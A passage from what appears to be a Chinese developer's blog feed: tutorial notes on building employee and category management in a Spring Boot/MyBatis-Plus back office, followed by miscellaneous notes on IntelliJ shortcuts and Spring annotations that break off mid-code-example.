title="代码开发"></a>代码开发</h2><p>在开发代码之前，需要梳理一下整个程序的执行过程：</p><p>1、页面发送ajax请求，将分页查询参数(page、pagesize、name)提交到服务端</p><p>2、服务端Controller接收页面提交的数据并调用Service查询数据</p><p>3、Service调用Mapper操作数据库，查询分页数据</p><p>4、Controller将查询到的分页数据响应给页面</p><p>5、页面接收到分页数据并通过ElementUI的Table组件展示到页面上</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305212205417.png"></p><p>（1）配置MybatisPlus分页插件</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305212335896.png"></p><p>（2）分页查询</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305212336661.png"></p><h1 id="启用-禁用员工账户"><a href="#启用-禁用员工账户" class="headerlink" title="启用/禁用员工账户"></a>启用/禁用员工账户</h1><h2 id="需求分析-4"><a href="#需求分析-4" class="headerlink" title="需求分析"></a>需求分析</h2><p>在员工管理列表页面，可以对某个员工账号进行启用或者禁用操作。账号禁用的员工不能登录系统，启用后的员工可以正常登录。</p><p>需要注意，只有管理员（admin用户）可以对其他普通用户进行启用、禁用操作，所以普通用户登录系统后启用、禁用按钮不显示。</p><p>在开发代码之前，需要梳理一下整个程序的执行过程：</p><p>1、页面发送ajax请求，将参数(id、 status)提交到服务端</p><p>2、服务端Controller接收页面提交的数据并调用Service更新数据</p><p>3、Service调用Mapper操作数据库</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305221757992.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305221759726.png"></p><h2 id="代码开发-4"><a href="#代码开发-4" class="headerlink" title="代码开发"></a>代码开发</h2><h3 id="update方法"><a href="#update方法" class="headerlink" title="update方法"></a>update方法</h3><p>启用、禁用员工账号，本质上就是一个更新操作，也就是对status状态字段进行操作在Controller中创建update方法，此方法是一个通用的修改员工信息的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307051230895.png"></p><p>由于前端的js精度16位，而ID是19位，需要添加对象转换器。否则点击禁用/编辑按钮返回的id数据精度不够，无法在数据库匹配到，导致更改无效。</p><h3 id="对象转换器"><a href="#对象转换器" class="headerlink" title="对象转换器"></a>对象转换器</h3><p>具体实现步骤:</p><p>1）提供对象转换器JacksonObjectMapper，基于Jackson进行Java对象到json数据的转换</p><p>2)在WebMvcConfig配置类中扩展Spring mvc的消息转换器，在此消息转换器中使用提供的对象转换器进行Java对象到json数据的转换</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307051244527.png"></p><h1 id="编辑员工信息"><a href="#编辑员工信息" class="headerlink" title="编辑员工信息"></a>编辑员工信息</h1><h2 id="需求分析-5"><a href="#需求分析-5" class="headerlink" title="需求分析"></a>需求分析</h2><p>在员工管理列表页面点击编辑按钮，跳转到编辑页面，在编辑页面<strong>回显</strong>员工信息并进行修改，最后点击保存按钮完成操作。</p><h2 id="代码开发-5"><a href="#代码开发-5" class="headerlink" title="代码开发"></a>代码开发</h2><p>在开发代码之前需要梳理一下操作过程和对应的程序的执行流程:</p><p>1、点击编辑按钮时，页面跳转到add.html，并在url中携带参数[员工id]</p><p>2、在add.html页面获取url中的参数[员工id]</p><p>3、发送ajax请求，请求服务端，同时提交员工id参数</p><p>4、服务端接收请求，根据员工id查询员工信息，将员工信息以json形式响应给页面</p><p>5、页面接收服务端响应的json数据，通过VUE的数据绑定进行员工信息回显</p><p>6、点击保存按钮，发送ajax请求，将页面中的员工信息以json方式提交给服务端</p><p>7、服务端接收员工信息，并进行处理，完成后给页面响应</p><p>8、页面接收到服务端响应信息后进行相应处理</p><p>注意: add.html页面为公共页面，新增员工和编辑员工都是在此页面操作</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307051405547.png"></p><p>因为在编写禁用员工状态时，写了update方法，可以通用，这里编辑功能的实现就可以借用update方法实现。</p><h1 id="分类管理"><a href="#分类管理" class="headerlink" title="分类管理"></a>分类管理</h1><h2 id="公共字段自动填充"><a href="#公共字段自动填充" class="headerlink" title="公共字段自动填充"></a>公共字段自动填充</h2><h3 id="需求分析-6"><a href="#需求分析-6" class="headerlink" title="需求分析"></a>需求分析</h3><p>前面已经完成了后台系统的员工管理功能开发，在新增员工时需要设置创建时间、创建人、修改时间、修改人等字段，在编辑员工时需要设置修改时间和修改人等字段。这些字段属于公共字段，也就是很多表中都有这些字段，如下:</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307051419164.png"></p><p>对于这些公共字段在某个地方统一处理，来简化开发——使用Mybatis Plus提供的公共字段自动填充功能。</p><h3 id="代码开发-6"><a href="#代码开发-6" class="headerlink" title="代码开发"></a>代码开发</h3><p>Mybatis Plus公共字段自动填充，也就是在插入或者更新的时候为指定字段赋予指定的值，使用它的好处就是可以统一对这些字段进行处理，避免了重复代码。</p><p>实现步骤：</p><p>1、在实体类的属性上加入@TableField注解，指定自动填充的策略</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307051635503.png"></p><p>2、按照框架要求编写元数据对象处理器，在此类中统一为公共字段赋值，此类需要实现MetaObjectHandler接口</p><p>下图是已经解决了无法取得id后的代码（MyMetaObjectHandler.java）</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307051733255.png"></p><p><strong>功能完善：</strong></p><p>createuser和updateuser</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307051735131.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307051736660.png"></p><p>把controller中的新增员工类，设置公共字段改为自动填充。</p><h2 id="新增分类"><a href="#新增分类" class="headerlink" title="新增分类"></a>新增分类</h2><h3 id="需求分析-7"><a href="#需求分析-7" class="headerlink" title="需求分析"></a>需求分析</h3><p>后台系统中可以管理分类信息，分类包括两种类型，分别是菜品分类和套餐分类。当我们在后台系统中添加菜品时需要选择一个菜品分类，当我们在后台系统中添加一个套餐时需要选择一个套餐分类，在移动端也会按照菜品分类和套餐分类来展示对应的菜品和套餐。</p><h3 id="数据模型-1"><a href="#数据模型-1" class="headerlink" title="数据模型"></a>数据模型</h3><p>新增分类，其实就是将我们新增窗口录入的分类数据插入到category表，表结构如下:</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307060208167.png"></p><h3 id="代码开发-7"><a href="#代码开发-7" class="headerlink" title="代码开发"></a>代码开发</h3><p>在开发业务功能前，先将需要用到的类和接口基本结构创建好：</p><p>1、实体类Category </p><p>2、Mapper接口CategoryMapper</p><p>3、业务层接口CategoryService</p><p>4、业务层实现类CategoryServicelmpl控制层CategoryController</p><p>在开发代码之前，需要梳理一下整个程序的执行过程：</p><p>1、页面(backend/page/category/list.html)发送ajax请求，将新增分类窗口输入的数据以json形式提交到服务端</p><p>2、服务端Controller接收页面提交的数据并调用Service将数据进行保存</p><p>3、Service调用Mapper操作数据库，保存数据</p><p>可以看到新增菜品分类和新增套餐分类请求的服务端地址和提交的json数据结构相同，所以服务端只需要提供一个方法统—外理即可</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307051815473.png"></p><h2 id="分类信息分页查询"><a href="#分类信息分页查询" class="headerlink" title="分类信息分页查询"></a>分类信息分页查询</h2><h3 id="需求分析-8"><a href="#需求分析-8" class="headerlink" title="需求分析"></a>需求分析</h3><p>系统中的分类很多的时候，如果在一个页面中全部展示出来会显得比较乱，不便于查看，所以一般的系统中都会以分页的方式来展示列表数据。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307061644747.png"></p><h3 id="代码开发-8"><a href="#代码开发-8" class="headerlink" title="代码开发"></a>代码开发</h3><p>在开发代码之前，需要梳理一下整个程序的执行过程：</p><p>1、页面发送ajax请求，将分页查询参数(page.pageSize)提交到服务端</p><p>2、服务端Controller接收页面提交的数据并调用Service查询数据</p><p>3、Service调用Mapper操作数据库，查询分页数据</p><p>4、Controller将查询到的分页数据响应给页面</p><p>5、页面接收到分页数据并通过ElementUI的Table组件展示到页面上</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307060223259.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307061645541.png"></p><h2 id="删除分类"><a href="#删除分类" class="headerlink" title="删除分类"></a>删除分类</h2><h3 id="需求分析-9"><a href="#需求分析-9" class="headerlink" title="需求分析"></a>需求分析</h3><p>在分类管理列表页面，可以对某个分类进行删除操作。需要注意的是当分类关联了菜品或者套餐时，此分类不允许删除。</p><h3 id="代码开发-9"><a href="#代码开发-9" class="headerlink" title="代码开发"></a>代码开发</h3><p>在开发代码之前，需要梳理一下整个程序的执行过程:</p><p>1、页面发送ajax请求，将参数(ids)提交到服务端</p><p>2、服务端Controller接收页面提交的数据并调用Service删除数据3、Service调用Mapper操作数据库</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307061650328.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307061717199.png"></p><h3 id="功能完善"><a href="#功能完善" class="headerlink" title="功能完善"></a>功能完善</h3><p>前面我们已经实现了根据id删除分类的功能，<strong>但是并没有检查删除的分类是否关联了菜品或者套餐</strong>，所以我们需要进行功能完善。</p><p>要完善分类删除功能,需要先准备基础的类和接口：</p><p>1、实体类Dish和Setmeal</p><p>2、Mapper接口DishMapper和SetmealMapper</p><p>3、Service接口Dishservice和SetmealService</p><p>4、Service实现类DishServicelmpl和SetmealServicelmpl</p><p>判断是否关联：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307062212023.png"></p><p>抛出异常功能：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307062216494.png"></p><p>删除功能完善：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307062213472.png"></p><h2 id="修改分类"><a href="#修改分类" class="headerlink" title="修改分类"></a>修改分类</h2><h3 id="需求分析-10"><a href="#需求分析-10" class="headerlink" title="需求分析"></a>需求分析</h3><p>在分类管理列表页面点击修改按钮，弹出修改窗口回显分类信息并进行修改，最后点击确认按钮完成修改操作。</p><h3 id="代码开发-10"><a href="#代码开发-10" class="headerlink" title="代码开发"></a>代码开发</h3><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307071155300.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>杂记</title>
      <link href="/2023/05/18/%E6%9D%82%E8%AE%B0/"/>
      <url>/2023/05/18/%E6%9D%82%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="idea注释的快捷键是什么"><a href="#idea注释的快捷键是什么" class="headerlink" title="idea注释的快捷键是什么"></a>idea注释的快捷键是什么</h2><p><strong>行注释快捷键</strong>：Ctrl+/</p><p><strong>块注释</strong>：Ctrl +Shift+ /</p><p><strong>方法说明注释</strong>：输入/**，再按“Enter”，自动根据参数和返回值生成注释模板</p><h2 id="IDEA软件快捷键"><a href="#IDEA软件快捷键" class="headerlink" title="IDEA软件快捷键"></a>IDEA软件快捷键</h2><p>如果你用的是idea软件，那就要换一个。<br>因为idea的ctrl+y是向下删除一行。</p><p><strong>IDEA通用快捷键</strong>：<br><strong>撤销</strong>：<code>ctrl+z</code><br><strong>取消撤销</strong>：<code>ctrl+backspace</code><br>backspace就是回车上面那个经常用来删除的键位。</p><h2 id="axios"><a href="#axios" class="headerlink" title="$axios"></a>$axios</h2><p>参考<a href="https://blog.csdn.net/m0_50570745/article/details/124019012">https://blog.csdn.net/m0_50570745/article/details/124019012</a></p><h2 id="Service注解"><a href="#Service注解" class="headerlink" title="@Service注解"></a>@Service注解</h2><p>如果一个类带了<code>@Service</code>注解，将自动注册到<code>Spring</code>容器，不需要再在<code>applicationContext.xml</code>配置文件中定义<code>bean</code>了，类似的还包括<code>@Component</code>、<code>@Repository</code>、<code>@Controller</code>。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service(&quot;courseDAO&quot;)</span></span><br><span class="line"><span class="meta">@Scope(&quot;prototype&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CourseDAOImpl</span> <span class="keyword">extends</span> <span class="title">HibernateDaoSupport</span> <span class="keyword">implements</span> <span class="title">CourseDAO</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其作用就相当于在<code>applicationContext.xml</code>配置文件里配置如下信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;courseDAO&quot;</span></span><br><span class="line">      <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.study.persistent.CourseDAOImpl&quot;</span> scope=<span class="string">&quot;prototype&quot;</span>&gt;</span><br><span class="line">      ......    </span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><p><code>@Service(&quot;serviceName&quot;)</code>注解相当于<code>applicationContext.xml</code>配置文件中配置的<code>&lt;bean id=&quot;serviceName&quot;&gt;</code>，表示给当前类命名一个别名，方便注入到其他需要用到的类中。</p><p><code>@Service</code>注解也可以不指定<code>serviceName</code>,如果不指定相当于<code>&lt;bean id=&quot;com.study.service.serviceName&quot;&gt;</code>，<code>com.study.service.ServiceName</code>就是这个类的全限定名,不加的话，默认别名就是当前类名，但是首字母小写。</p><p>spring2.5之后出现的注解，就跟在<code>spring</code>配置文件里配置<code>bean</code>差不多的功能，就是让<code>spring</code>自动扫描管理组件，<code>@Service</code> 、<code>@Controller</code> 、<code>@Repository</code> 、<code>@Component</code> ，这四个其实是一样的功能，没有区别，只是在<code>MVC</code>模式上表示的层不一样，<code>service</code>一般标注在<code>service</code>层的<code>bean</code>上，<code>controller</code>标注在控制层，<code>@Repository</code>标注在<code>view</code>层，<code>component</code>通用。</p><h2 id="Slf4j注解"><a href="#Slf4j注解" class="headerlink" title="@Slf4j注解"></a>@Slf4j注解</h2><p><strong>@Slf4j是用作日志输出的</strong>，一般会在项目每个类的开头加入该注解。</p><p>添加了该注释之后，这样就省去这段很长的代码，就可以在代码中直接引用<code>log.info( )</code> 打印日志了</p><h2 id="Configuration注解"><a href="#Configuration注解" class="headerlink" title="@Configuration注解"></a>@Configuration注解</h2><p><code>@Configuration</code> 用于定义配置类，可替换XML配置文件，被注解的类内部包含一个或多个<code>@Bean</code>注解方法。可以被<code>AnnotationConfigApplicationContext</code>或者<code>AnnotationConfigWebApplicationContext</code> 进行扫描。用于构建bean定义以及初始化Spring容器。</p><p>　　它是在spring3.0版本之后出现的。此注解是spring支持注解驱动开发的一个标志。表明当前类是spring的一个配置类，作用是替代spring的applicationContext.xml。但其本质就是@Component注解，被此注解修饰的类，也会被存入spring的IOC容器。</p><p>属性：<br>　　value:用于存入spring的ioc容器中Bean的id<br>使用场景:<br>　　在注解驱动开发时，用于缩写配置的类，通常可以使用此注解。一般情况下，我们的配置也会分为主次配置，@Configureation一般出现在主配置类上。值得注意的是，如果我们在注解驱动开发时，构建ioc容器使用的是传入字节码的构造函数，此注解可以省略，但是如果传入的是一个包，此注解则不能省略。</p><p><strong>总结</strong></p><ul><li>@Configuation等价于<code>&lt;Beans&gt;&lt;/Beans&gt;</code></li><li>@Bean 等价于<code>&lt;Bean&gt;&lt;/Bean&gt;</code></li><li>@ComponentScan等价于<code>&lt;context:component-scan base-package=&quot;com.dxz.demo&quot;/&gt;</code></li><li>@Component 等价于<code>&lt;Bean&gt;&lt;/Bean&gt;</code></li></ul><h2 id="SpringApplication-run"><a href="#SpringApplication-run" class="headerlink" title="SpringApplication.run()"></a>SpringApplication.run()</h2><h3 id="启动类"><a href="#启动类" class="headerlink" title="启动类"></a><strong>启动类</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DspApplication</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">SpringApplication.run(DspApplication.class, args);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里run方法做了两件事：</p><p>1.创建SpringApplication对象</p><p>2.执行run方法</p><p>1.创建SpringApplication对象。SpringApplication.run()方法的基本调用流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ConfigurableApplicationContext <span class="title">run</span><span class="params">(Object source, String... args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> run(<span class="keyword">new</span> Object[] &#123; source &#125;, args);</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ConfigurableApplicationContext <span class="title">run</span><span class="params">(Object[] sources, String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> SpringApplication(sources).run(args);</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">SpringApplication</span><span class="params">(Object... sources)</span> </span>&#123;</span><br><span class="line">initialize(sources);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>initialize方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(Object[] sources)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在sources不为空时，保存配置类</span></span><br><span class="line">    <span class="keyword">if</span> (sources != <span class="keyword">null</span> &amp;&amp; sources.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.sources.addAll(Arrays.asList(sources));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断是否为web应用</span></span><br><span class="line">    <span class="keyword">this</span>.webEnvironment = deduceWebEnvironment();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取并保存容器初始化类，通常在web应用容器初始化使用</span></span><br><span class="line">    <span class="comment">// 利用loadFactoryNames方法从路径MEAT-INF/spring.factories中找到所有的ApplicationContextInitializer</span></span><br><span class="line">    setInitializers((Collection) getSpringFactoriesInstances(</span><br><span class="line">        ApplicationContextInitializer.class));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取并保存监听器</span></span><br><span class="line">    <span class="comment">// 利用loadFactoryNames方法从路径MEAT-INF/spring.factories中找到所有的ApplicationListener</span></span><br><span class="line">    setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 从堆栈信息获取包含main方法的主配置类</span></span><br><span class="line">    <span class="keyword">this</span>.mainApplicationClass = deduceMainApplicationClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用run方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title">run</span><span class="params">(String... args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计时类，挺好用    </span></span><br><span class="line">StopWatch stopWatch = <span class="keyword">new</span> StopWatch();</span><br><span class="line">stopWatch.start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个Context容器</span></span><br><span class="line">ConfigurableApplicationContext context = <span class="keyword">null</span>;</span><br><span class="line">FailureAnalyzers analyzers = <span class="keyword">null</span>;</span><br><span class="line">configureHeadlessProperty();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取监听器</span></span><br><span class="line"><span class="comment">// 利用loadFactoryNames方法从路径MEAT-INF/spring.factories中找到所有的SpringApplicationRunListener</span></span><br><span class="line">SpringApplicationRunListeners listeners = getRunListeners(args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用监听器的启动</span></span><br><span class="line"><span class="comment">// 调用每个SpringApplicationRunListener的starting方法</span></span><br><span class="line">listeners.started();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将参数封装到ApplicationArguments对象中</span></span><br><span class="line">ApplicationArguments applicationArguments = <span class="keyword">new</span> DefaultApplicationArguments(args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建并配置Environment（这个过程会加载application配置文件）</span></span><br><span class="line"><span class="comment">// 触发监听事件——调用每个SpringApplicationRunListener的environmentPrepared方法</span></span><br><span class="line">ConfigurableEnvironment environment = prepareEnvironment(listeners, applicationArguments);</span><br><span class="line">  </span><br><span class="line">Banner printedBanner = printBanner(environment);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据应用类型创建对应的Context容器,是否为web环境创建web容器或者普通的IOC容器</span></span><br><span class="line">context = createApplicationContext();</span><br><span class="line">analyzers = <span class="keyword">new</span> FailureAnalyzers(context);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 刷新Context容器之前的准备</span></span><br><span class="line"><span class="comment">// 准备上下文</span></span><br><span class="line">        <span class="comment">// 1.将environment保存到容器中</span></span><br><span class="line">        <span class="comment">// 2.触发监听事件——调用每个SpringApplicationRunListeners的contextPrepared方法</span></span><br><span class="line">        <span class="comment">// 3.调用ConfigurableListableBeanFactory的registerSingleton方法向容器中注入applicationArguments与printedBanner</span></span><br><span class="line">        <span class="comment">// 4.触发监听事件——调用每个SpringApplicationRunListeners的contextLoaded方法</span></span><br><span class="line">prepareContext(context, environment, listeners, applicationArguments, printedBanner);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 刷新Context容器  </span></span><br><span class="line">refreshContext(context);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 刷新Context容器之后处理</span></span><br><span class="line">afterRefresh(context, applicationArguments);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Context容器refresh完毕发布</span></span><br><span class="line">listeners.finished(context, <span class="keyword">null</span>);</span><br><span class="line">stopWatch.stop();</span><br><span class="line"><span class="keyword">if</span> (logStartupInfo)&#123;</span><br><span class="line"><span class="keyword">new</span> StartupInfoLogger(mainApplicationClass).logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> context;</span><br><span class="line">&#125;<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">handleRunFailure(context, listeners, analyzers, ex);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>SpringApplication.run一共做了两件事：</p><p>1.创建SpringApplication对象：在对象初始化时保存事件监听器，容器初始化类以及判断是否为web应用，保存包含main方法的主配置类。<br>2.调用run方法：准备spring的上下文，完成容器的初始化，创建，加载等。会在不同的时机触发监听器的不同事件。</p><h2 id="TableField注解"><a href="#TableField注解" class="headerlink" title="@TableField注解"></a>@TableField注解</h2><p>@TableField 注解表示该字段是数据库字段，支持的属性包括：value、exist、el、condition、update、insertStrategy、updateStrategy、whereStrategy、fill。</p><p>其中，fill 属性就是用来设置自动填充策略的。FieldFill 是一个枚举类型，它定义了 4 种自动填充策略，分别为：</p><p>DEFAULT: 不进行任何填充<br>INSERT: 插入时填充<br>UPDATE: 更新时填充<br>INSERT_UPDATE: 插入和更新时都填充<br>当我们在实体类中使用 @TableField(fill = FieldFill.INSERT) 注解时，表示该字段在插入数据时会自动填充相应的值，而在更新数据时不会进行填充。</p><h2 id="Data注解"><a href="#Data注解" class="headerlink" title="@Data注解"></a>@Data注解</h2><p>@Data注解的主要作用是提高代码的简洁，使用这个注解可以省去实体类中大量的get()、 set()、 toString()等方法。</p><p>简单来说就是<strong>不用再手动添加构造方法和get/set等方法了，大大提高了写代码的速度。</strong></p><h2 id="Mapper注解"><a href="#Mapper注解" class="headerlink" title="@Mapper注解"></a>@Mapper注解</h2><p>作用：在接口类上添加了@Mapper，在编译后会生成相应的接口实现类。</p><p>添加位置：在接口类上边。例：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305181849910.png"></p><h2 id="RestController注解"><a href="#RestController注解" class="headerlink" title="@RestController注解"></a>@RestController注解</h2><p>@RestController注解相当于@ResponseBody 和 @Controller合在一起的作用</p><p>要想明白 @RestController 的作用，首先需要明白@ResponseBody 和 @Controller 的作用。</p><p>@Controller ：将当前修饰的类注入 IOC 容器，使得从该类所在的项目跑起来的过程中，这个类就被实例化。同时也有语义化的作用，即代表该类是充当 Controller 的作用</p><p>@ResponseBody：它的作用就是指该类中所有的API接口返回的数据，不管你对应的方法返回 Map 或是其他Object，它会以 Json 字符串的形式返回给客户端</p><p>所以 @RestController注解其实就是<strong>将 return 中的内容以 JSON字符串的形式返回客户端</strong></p><p>需要注意的是，如果要配合 sping-mvc 的视图解析器使用，也就是如果要返回 html 或者 jsp 时，就只能用 @Controller，因为当@Controller修饰的时候，Spring 才会认为返回的是一个 视图</p><h2 id="RequestMapping注解"><a href="#RequestMapping注解" class="headerlink" title="@RequestMapping注解"></a>@RequestMapping注解</h2><p><strong>作用</strong>：<strong>用于将任意HTTP 请求映射到控制器方法上</strong>。</p><p>@RequestMapping表示共享映射，如果没有指定请求方式，将接收GET、POST、HEAD、OPTIONS、PUT、PATCH、DELETE、TRACE、CONNECT所有的HTTP请求方式。@GetMapping、@PostMapping、@PutMapping、@DeleteMapping、@PatchMapping 都是HTTP方法特有的快捷方式@RequestMapping的变体，分别对应具体的HTTP请求方式的映射注解。</p><p>@RequestMapping 注解可以在控制器类上和控制器类中的方法上使用。</p><p>在类的级别上的注解会将一个特定请求或者请求模式映射到一个控制器之上。之后你还可以另外添加方法级别的注解来进一步指定到处理方法的映射关系。</p><p>需要注意的是，<strong>控制器方法都应该映射到一个特定的HTTP方法</strong>，而不是使用@RequestMapping共享映射。</p><p><strong>实例A</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"><span class="comment">// 映射到方法上</span></span><br><span class="line"><span class="comment">// localhost:8080/user/login</span></span><br><span class="line"><span class="comment">// 此处通常用 @GetMapping(&quot;/user/login&quot;) 表明GET请求方式的映射，因为login登录只需向服务器获取用户数据。</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/user/login&quot;)</span>  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user login&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 映射到方法上</span></span><br><span class="line">    <span class="comment">// localhost:8080/user/register</span></span><br><span class="line">    <span 